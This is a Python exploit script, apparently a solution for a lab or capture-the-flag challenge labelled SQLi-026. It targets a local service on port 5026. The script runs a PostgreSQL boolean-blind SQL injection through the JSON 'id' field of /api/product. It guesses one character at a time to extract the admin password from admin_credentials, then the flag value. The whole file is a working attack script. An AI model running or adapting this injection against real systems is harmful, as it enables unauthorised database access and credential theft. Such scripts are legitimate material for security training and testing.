#!/usr/bin/env python3
"""SQLi-026: PostgreSQL Boolean Blind via JSON Exploit"""
import requests
import string

BASE_URL = "http://localhost:5026"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(payload):
    r = requests.post(f"{BASE_URL}/api/product", json={"id": payload}, timeout=10)
    return r.json().get("status") == "found"

def extract(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            payload = f"1 AND (SELECT SUBSTRING({column} FROM {pos} FOR 1) FROM {table} LIMIT 1)='{c}'"
            if check(payload):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-026: PostgreSQL JSON Blind Exploit")
    print("=" * 40)
    extract("admin_credentials", "password")
    flag = extract("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
